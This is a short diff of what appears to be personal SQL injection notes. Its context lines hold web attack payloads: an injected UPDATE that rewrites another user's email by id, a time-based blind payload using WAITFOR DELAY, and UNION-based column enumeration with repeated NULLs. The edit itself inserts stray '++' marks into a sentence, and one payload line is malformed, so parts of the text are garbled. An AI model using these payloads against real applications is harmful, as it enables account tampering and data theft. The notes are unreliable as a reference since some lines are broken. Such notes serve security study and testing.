@@ -61,7 +61,6 @@ Delete (DELETE):
 
   email=newemial@gmail.com' WHERE id= {not_yours};--
   UPDATE customers SET email = 'newemail@example.com' WHERE id = -1 ;--
-
   # Blind Based PAYLOADS
   email=test@emial.com' WAITFOR DELAY '0:0:10'--
 
@@ -80,8 +79,8 @@ Select Column1 , Column2 from table1 Union select column3 and column4 from table
 (i) Number of columns should be same in two tables
 (ii) Datatypes must be same
 
-# So to determine number of columns called in f
-irst query we will use
+# So to determine number of columns called in f++
+++irst query we will use
 select ?(don't know) from table1 UNION select NULL
 # if the number of column mismatch we will get an error and we have to try again
 select ?(don't know) from table1 UNION select NULL,NULL'NULL
